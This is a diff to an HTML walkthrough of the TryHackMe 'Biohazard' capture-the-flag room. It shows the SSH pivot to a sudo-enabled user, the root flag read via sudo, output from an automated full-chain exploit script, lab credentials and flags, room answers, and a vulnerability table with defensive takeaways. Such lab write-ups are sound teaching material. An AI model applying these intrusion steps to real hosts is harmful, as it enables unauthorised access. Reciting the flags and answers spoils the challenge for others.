+                    <h2 class="step-title">Phase 6 — SSH, Vigenere × 2, Root</h2>
                 </div>
             </div>
-            <p class="prose">SSH in as <code>umbrella_guest</code>. Inside the jailcell, Chris's note reveals the MO Disk 2 key: <code>albert</code>. This key decrypts MO Disk 1 (Vigenere), yielding Weasker's password:</p>
+            <p class="prose">SSH in as <code>umbrella_guest</code>. The file at <code>/home/umbrella_guest/.jailcell/chris.txt</code> contains story text and the <strong>MO Disk 2 key: <code>albert</code></strong>. This key decrypts MO Disk 1 via Vigenere, yielding Weasker's password. Weasker is in the <code>sudo</code> group — one command from root.</p>
 
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-                <div class="code-body"><pre><span class="cmd-p">$</span> ssh umbrella_guest@TARGET  <span class="cmt"># pass: T_virus_rules</span>
+                <div class="code-body"><pre><span class="cmd-p">$</span> ssh umbrella_guest@TARGET  <span class="cmt"># password: T_virus_rules</span>
 
 <span class="cmd-p">umbrella_guest$</span> cat ~/.jailcell/chris.txt
 <span class="out-line">... MO disk 2 key: albert ...</span></pre></div>
@@ -626,25 +645,25 @@ result = base64.b64decode(combined + <span class="str">"=="</span>).decode()
 
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">PYTHON3</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-                <div class="code-body"><pre><span class="cmt"># Vigenere decrypt MO_DISK1 with key "albert"</span>
+                <div class="code-body"><pre><span class="cmt"># Vigenere decrypt MO_DISK1 (key = "albert")</span>
 cipher = <span class="str">"wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_rvmexa_ajk"</span>
 key    = <span class="str">"albert"</span>
-<span class="cmt"># → weasker login password, stars_members_are_my_guinea_pig</span></pre></div>
+<span class="cmt"># → "weasker login password, stars_members_are_my_guinea_pig"</span></pre></div>
             </div>
 
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-                <div class="code-body"><pre><span class="cmd-p">$</span> ssh weasker@TARGET  <span class="cmt"># pass: stars_members_are_my_guinea_pig</span>
+                <div class="code-body"><pre><span class="cmd-p">$</span> ssh weasker@TARGET  <span class="cmt"># password: stars_members_are_my_guinea_pig</span>
 
 <span class="cmd-p">weasker$</span> id
 <span class="out-line">uid=1002(weasker) gid=1002(weasker) groups=1002(weasker),27(sudo)</span>
 
 <span class="cmd-p">weasker$</span> echo stars_members_are_my_guinea_pig | sudo -S cat /root/root.txt
-<span class="out-line" style="color:var(--red);font-weight:700;">flag{3c5794a00dc56c35f2bf096571edf3bf}</span></pre></div>
+<span class="out-line" style="color:var(--red);font-weight:700;">3c5794a00dc56c35f2bf096571edf3bf</span></pre></div>
             </div>
 
             <div class="flag-banner">
-                <div class="flag-label"><i class="fas fa-flag"></i> &nbsp;Root Flag</div>
+                <div class="flag-label"><i class="fas fa-skull"></i> &nbsp;Root Flag</div>
                 <div class="flag-value">3c5794a00dc56c35f2bf096571edf3bf</div>
             </div>
         </section>
@@ -663,42 +682,42 @@ key    = <span class="str">"albert"</span>
                     <div class="chain-dot">1</div>
                     <div class="chain-info">
                         <div class="chain-label">Mansion Room Crawl</div>
-                        <div class="chain-detail">HTML source mining → <code>emblem</code>, <code>lock_pick</code>, <code>blue_jewel</code> collected</div>
+                        <div class="chain-detail">HTML source mining, ROT13, base64 comments → <code>emblem</code>, <code>lock_pick</code>, <code>blue_jewel</code></div>
                     </div>
                 </div>
                 <div class="chain-step">
                     <div class="chain-dot">2</div>
                     <div class="chain-info">
                         <div class="chain-label">Form POST Item Collection</div>
-                        <div class="chain-detail">Tiger Room, Gallery, Bar Room chain (ROT13 + base32 + Vigenere) → <code>shield_key</code> → Crests 3 &amp; 4</div>
+                        <div class="chain-detail">Tiger Room → Crest 1 · Gallery → Crest 2 · Bar Room chain (base32 + Vigenere/rebecca) → <code>shield_key</code> → Armor Room / Attic → Crests 3 &amp; 4</div>
                     </div>
                 </div>
                 <div class="chain-step">
                     <div class="chain-dot">3</div>
                     <div class="chain-info">
                         <div class="chain-label">Four-Crest Decode Chain</div>
-                        <div class="chain-detail">base64→base32 / base32→base58 / binary→hex / base58→hex→base64 → FTP creds <span class="flag-hl">hunter:you_cant_hide_forever</span></div>
+                        <div class="chain-detail">b64→b32 / b32→b58 / b64→binary→hex / b58→hex → concatenate → base64 decode → <span class="flag-hl">hunter:you_cant_hide_forever</span></div>
                     </div>
                 </div>
                 <div class="chain-step">
                     <div class="chain-dot">4</div>
                     <div class="chain-info">
-                        <div class="chain-label">FTP + Steganography</div>
-                        <div class="chain-detail">steghide (001) + EXIF Comment (002) + ZIP-in-JPEG (003) → GPG passphrase → <span class="flag-hl">helmet_key</span></div>
+                        <div class="chain-label">FTP + Three-Method Steganography</div>
+                        <div class="chain-detail">steghide (001) + EXIF Comment (002) + ZIP-in-JPEG (003) → assemble + b64 decode → GPG pass → <span class="flag-hl">helmet_key{458493...}</span></div>
                     </div>
                 </div>
                 <div class="chain-step">
                     <div class="chain-dot">5</div>
                     <div class="chain-info">
                         <div class="chain-label">Secret Room Unlock</div>
-                        <div class="chain-detail">Study Room → SSH user (<code>umbrella_guest</code>) · Hidden Closet → SSH pass + MO_DISK1 ciphertext</div>
+                        <div class="chain-detail">Study Room → <code>doom.tar.gz</code> → SSH user · Hidden Closet → SSH pass + MO_DISK1 Vigenere ciphertext</div>
                     </div>
                 </div>
                 <div class="chain-step">
                     <div class="chain-dot">6</div>
                     <div class="chain-info">
-                        <div class="chain-label">SSH + Vigenere Pivot</div>
-                        <div class="chain-detail">Jailcell note → MO Disk 2 key <code>albert</code> → decrypt MO_DISK1 → <code>weasker</code> password</div>
+                        <div class="chain-label">SSH + Double Vigenere Pivot</div>
+                        <div class="chain-detail"><code>.jailcell/chris.txt</code> → MO Disk 2 key <code>albert</code> → decrypt MO_DISK1 → <code>weasker</code> password</div>
                     </div>
                 </div>
                 <div class="chain-step">
@@ -740,6 +759,29 @@ key    = <span class="str">"albert"</span>
             </div>
         </section>
 
+        <!-- THM QUESTIONS -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num"><i class="fas fa-question" style="font-size:.55rem"></i></div>
+                <div>
+                    <div class="step-label">TryHackMe</div>
+                    <h2 class="step-title">Room Questions</h2>
+                </div>
+            </div>
+            <div class="vuln-table-wrap">
+                <table class="vuln-table">
+                    <thead><tr><th>Question</th><th>Answer</th></tr></thead>
+                    <tbody>
+                        <tr><td>How many open ports?</td><td><code>3</code></td></tr>
+                        <tr><td>What is the team name in Operation Biohazard?</td><td><code>STARS</code></td></tr>
+                        <tr><td>Where was Chris found?</td><td><code>jailcell</code></td></tr>
+                        <tr><td>What is the name of the ultimate form?</td><td><code>Tyrant</code></td></tr>
+                        <tr><td>Who is the STARS Bravo team leader?</td><td><code>Enrico Marini</code></td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
         <!-- VULNERABILITIES -->
         <section class="writeup-section">
             <div class="step-header">
@@ -753,13 +795,13 @@ key    = <span class="str">"albert"</span>
                 <table class="vuln-table">
                     <thead><tr><th>Finding</th><th>Location</th><th>Severity</th><th>Impact</th></tr></thead>
                     <tbody>
-                        <tr><td>Sudo-enabled user with known password</td><td>SSH / weasker</td><td><span class="sev-crit">Critical</span></td><td>Full root compromise via <code>sudo</code></td></tr>
-                        <tr><td>Credentials in FTP-accessible JPEG stego</td><td>FTP / JPEGs</td><td><span class="sev-high">High</span></td><td>GPG passphrase recovery</td></tr>
+                        <tr><td>Sudo-enabled user with derivable password</td><td>SSH / weasker</td><td><span class="sev-crit">Critical</span></td><td>Full root compromise via <code>sudo</code></td></tr>
+                        <tr><td>GPG passphrase split across JPEG stego</td><td>FTP / JPEGs</td><td><span class="sev-high">High</span></td><td>GPG passphrase recovery → helmet_key</td></tr>
                         <tr><td>SSH credentials in plaintext web files</td><td>HTTP / medals</td><td><span class="sev-high">High</span></td><td>Direct SSH access as <code>umbrella_guest</code></td></tr>
-                        <tr><td>FTP credentials derivable from web crests</td><td>HTTP / FTP</td><td><span class="sev-high">High</span></td><td>FTP lateral access</td></tr>
-                        <tr><td>Vigenere cipher for "secret" data</td><td>Web / MO Disk</td><td><span class="sev-med">Medium</span></td><td>Trivially reversible given key source</td></tr>
-                        <tr><td>Secret room URLs leaked via redirect headers</td><td>HTTP</td><td><span class="sev-med">Medium</span></td><td>Area unlock without brute-force</td></tr>
-                        <tr><td>Sensitive paths in HTML comments / ROT13</td><td>HTTP source</td><td><span class="sev-low">Low</span></td><td>Navigation to restricted areas</td></tr>
+                        <tr><td>FTP credentials derivable from crest chain</td><td>HTTP / FTP</td><td><span class="sev-high">High</span></td><td>FTP lateral access</td></tr>
+                        <tr><td>Secret room URLs leaked in Location headers</td><td>HTTP</td><td><span class="sev-med">Medium</span></td><td>Area unlock without brute-force</td></tr>
+                        <tr><td>Vigenere cipher protecting account credentials</td><td>Web / MO Disk</td><td><span class="sev-med">Medium</span></td><td>Trivially reversible once key is found</td></tr>
+                        <tr><td>Sensitive paths embedded in HTML comments / ROT13</td><td>HTTP source</td><td><span class="sev-low">Low</span></td><td">Navigation to restricted areas</td></tr>
                     </tbody>
                 </table>
             </div>
@@ -778,32 +820,32 @@ key    = <span class="str">"albert"</span>
                 <div class="takeaway">
                     <div class="takeaway-icon" style="color:var(--red)"><i class="fas fa-code"></i></div>
                     <div class="takeaway-title">Never embed paths in HTML comments</div>
-                    <div class="takeaway-text">Comments like <code>&lt;!-- href="/mansionmain/" --&gt;</code> hand attackers the sitemap. Server-side routing should never leak internal paths client-side.</div>
+                    <div class="takeaway-text">Comments like <code>&lt;!-- href="/mansionmain/" --&gt;</code> hand attackers the sitemap. Internal paths must never appear client-side.</div>
                 </div>
                 <div class="takeaway">
                     <div class="takeaway-icon" style="color:var(--orange)"><i class="fas fa-unlock"></i></div>
                     <div class="takeaway-title">Redirect headers reveal secret URLs</div>
-                    <div class="takeaway-text">Secret room URLs returned in <code>Location</code> headers are trivially observable with <code>curl -v</code>. Security through obscurity is not access control.</div>
+                    <div class="takeaway-text">Secret room URLs in <code>Location</code> headers are trivially observable with <code>curl -v</code>. Obscurity is not access control.</div>
                 </div>
                 <div class="takeaway">
                     <div class="takeaway-icon" style="color:var(--yellow)"><i class="fas fa-key"></i></div>
-                    <div class="takeaway-title">Symmetric ciphers ≠ encryption</div>
-                    <div class="takeaway-text">Vigenere and ROT13 are encodings. Once the key is found anywhere in the system, all ciphertexts are broken. Use AES-256-GCM for secrets.</div>
+                    <div class="takeaway-title">Encoding ≠ encryption</div>
+                    <div class="takeaway-text">Vigenere, ROT13, and base64 are trivially reversible. Once the key appears anywhere in the system, all ciphertexts are broken. Use AES-256-GCM for secrets.</div>
                 </div>
                 <div class="takeaway">
                     <div class="takeaway-icon" style="color:var(--blue)"><i class="fas fa-image"></i></div>
                     <div class="takeaway-title">Steganography is not security</div>
-                    <div class="takeaway-text">Data hidden in EXIF fields or appended ZIP archives is trivially recovered with <code>exiftool</code> and <code>unzip</code>. Credentials must never be hidden in media files.</div>
+                    <div class="takeaway-text">EXIF fields and ZIP-appended JPEGs are recovered in seconds with <code>exiftool</code> and <code>unzip</code>. Credentials must never live inside media files.</div>
                 </div>
                 <div class="takeaway">
                     <div class="takeaway-icon" style="color:var(--purple)"><i class="fas fa-user-shield"></i></div>
                     <div class="takeaway-title">Audit sudo group membership</div>
-                    <div class="takeaway-text">Any user in the <code>sudo</code> group with a guessable or derivable password is a one-command root. Review <code>/etc/sudoers</code> and apply least privilege.</div>
+                    <div class="takeaway-text">Any user in <code>sudo</code> with a derivable password is one command from root. Review <code>/etc/sudoers</code> and enforce least privilege strictly.</div>
                 </div>
                 <div class="takeaway">
                     <div class="takeaway-icon" style="color:var(--aqua)"><i class="fas fa-sitemap"></i></div>
-                    <div class="takeaway-title">Sequential dependency chains</div>
-                    <div class="takeaway-text">Each item was required for the next phase — perfect for CTF design, but also a reminder that credential reuse across services creates exploitable pivot chains in real environments.</div>
+                    <div class="takeaway-title">Sequential credential chains</div>
+                    <div class="takeaway-text">Each item unlocked the next phase — a reminder that credential reuse and chained dependencies across services create exploitable pivot paths in real environments.</div>
                 </div>
             </div>
         </section>
@@ -817,7 +859,7 @@ key    = <span class="str">"albert"</span>
                     <h2 class="step-title">Full-Chain Exploit Script</h2>
                 </div>
             </div>
-            <p class="prose">All 10 phases are automated in <code>biohazard_pwn.sh</code> — a Bash script that chains web item collection, crest decoding (Python3), FTP download, steghide/exiftool/unzip extraction, GPG decryption, SSH pivoting, and Vigenere decode to dump all flags in a single run.</p>
+            <p class="prose">All phases are automated in <code>biohazard_pwn.sh</code> — a Bash script that chains web item collection, crest decoding (Python3), FTP download, steghide / exiftool / unzip extraction, GPG decryption, SSH pivoting, and Vigenere decode to dump all flags in a single run.</p>
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
                 <div class="code-body"><pre><span class="cmd-p">$</span> chmod +x biohazard_pwn.sh
@@ -830,9 +872,9 @@ key    = <span class="str">"albert"</span>
 <span class="out-line">[+] gold_emblem: gold_emblem{58a8c41a9d08b8a4e38d02a4d7ff4843}</span>
 <span class="out-line">[+] shield_key:  shield_key{48a7a9227cd7eb89f0a062590798cbac}</span>
 <span class="out-line">[+] helmet_key:  helmet_key{458493193501d2b94bbab2e727f8db4b}</span>
-<span class="out-line">[+] FTP: hunter / you_cant_hide_forever</span>
-<span class="out-line">[+] SSH: umbrella_guest / T_virus_rules</span>
-<span class="out-line">[+] Weasker: weasker / stars_members_are_my_guinea_pig</span>
+<span class="out-line">[+] FTP:         hunter / you_cant_hide_forever</span>
+<span class="out-line">[+] SSH:         umbrella_guest / T_virus_rules</span>
+<span class="out-line">[+] Weasker:     weasker / stars_members_are_my_guinea_pig</span>
 <span class="out-line" style="color:var(--red);font-weight:700;">[+] ROOT FLAG:   3c5794a00dc56c35f2bf096571edf3bf</span></pre></div>
             </div>
         </section>
@@ -853,10 +895,11 @@ key    = <span class="str">"albert"</span>
                         <tr><td><code>nmap</code></td><td>Port scan and service fingerprint</td></tr>
                         <tr><td><code>curl</code></td><td>Web room enumeration and all form POSTs</td></tr>
                         <tr><td><code>gobuster</code></td><td>Directory brute-force for hidden paths</td></tr>
-                        <tr><td><code>steghide</code></td><td>Extract hidden data from 001-key.jpg (empty password)</td></tr>
+                        <tr><td><code>steghide</code></td><td>Extract hidden key from 001-key.jpg (empty password)</td></tr>
                         <tr><td><code>exiftool</code></td><td>Read EXIF Comment field from 002-key.jpg</td></tr>
-                        <tr><td><code>unzip</code></td><td>Extract ZIP appended to 003-key.jpg</td></tr>
+                        <tr><td><code>unzip</code></td><td>Extract ZIP appended to 003-key.jpg → key-003.txt</td></tr>
                         <tr><td><code>gpg</code></td><td>Decrypt helmet_key.txt.gpg with assembled passphrase</td></tr>
+                        <tr><td><code>john</code></td><td>Password analysis / hash cracking support</td></tr>
                         <tr><td><code>python3</code></td><td>base64 / base32 / base58 / Vigenere decode chain</td></tr>
                         <tr><td><code>ssh</code></td><td>Initial access as umbrella_guest, pivot to weasker</td></tr>
                         <tr><td><code>biohazard_pwn.sh</code></td><td>Full-chain automated exploit (Bash + Python3)</td></tr>
